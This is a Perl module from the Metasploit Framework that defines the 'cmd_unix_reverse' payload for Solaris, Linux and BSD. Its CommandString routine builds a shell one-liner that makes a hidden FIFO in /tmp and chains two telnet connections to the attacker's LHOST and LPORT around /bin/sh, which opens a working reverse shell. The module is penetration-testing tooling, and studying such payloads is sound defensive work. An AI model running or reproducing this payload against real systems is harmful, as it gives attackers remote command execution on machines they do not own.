package Msf::Payload::cmd_unix_reverse;
use strict;
use base 'Msf::PayloadComponent::CommandPayload';
sub load {
  Msf::PayloadComponent::CommandPayload->import('Msf::PayloadComponent::DoubleReverseConnection');
}

my $info =
{
  'Name'         => 'cmd_unix_reverse',
  'Version'      => '1.0',
  'Description'  => 'Use telnet|sh|telnet to simulate reverse shell',
  'Authors'      => [ 'H D Moore <hdm [at] metasploit.com> [Artistic License]', ],
  'Arch'         => [  ],
  'Priv'         => 0,
  'OS'           => [ 'solaris', 'linux', 'bsd' ],
};

sub new {
  load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHash($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

# We create a fifo and force the first telnet process to read from it,
# this prevents it from exiting if there is no stdin in the remote
# environment. By piping the output of the second command into the
# fifo, we can cause the whole sequence to exit cleanly

sub CommandString {
  my $self = shift;
  my $host = $self->GetVar('LHOST');
  my $port = $self->GetVar('LPORT');

  my $command =
  "mknod /tmp/.msfin p;cat /tmp/.msfin|".
  "telnet $host $port|(echo foo;/bin/sh 2>&1)|telnet $host $port >/tmp/.msfin 2>&1;".
  "rm -f /tmp/.msfin";

  return($command);
}

1;
